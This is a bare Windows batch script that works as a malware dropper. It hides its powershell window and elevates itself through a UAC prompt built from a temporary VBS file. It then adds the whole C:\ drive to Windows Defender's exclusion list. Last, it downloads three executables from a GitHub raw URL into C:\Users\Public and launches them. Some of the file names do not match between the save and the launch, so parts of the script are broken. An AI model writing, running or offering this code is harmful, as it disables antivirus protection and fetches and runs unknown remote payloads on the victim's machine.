:--------------------------------------
powershell -window hidden -command ""
:--------------------------------------
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
:--------------------------------------
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:--------------------------------------
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
:--------------------------------------
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:--------------------------------------
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0
:--------------------------------------
powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
:--------------------------------------
cd "C:\Users\Public"
:--------------------------------------
@echo off
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/ghanimuji/hellotesting/main/Important.exe' -OutFile Important.exe"
start Important.exe
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/ghanimuji/hellotesting/main/Ven.exe' -OutFile Importan2.exe"
start Important2.exe
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/ghanimuji/hellotesting/main/An.exe' -OutFile Importan3.exe"
start Important3.exe

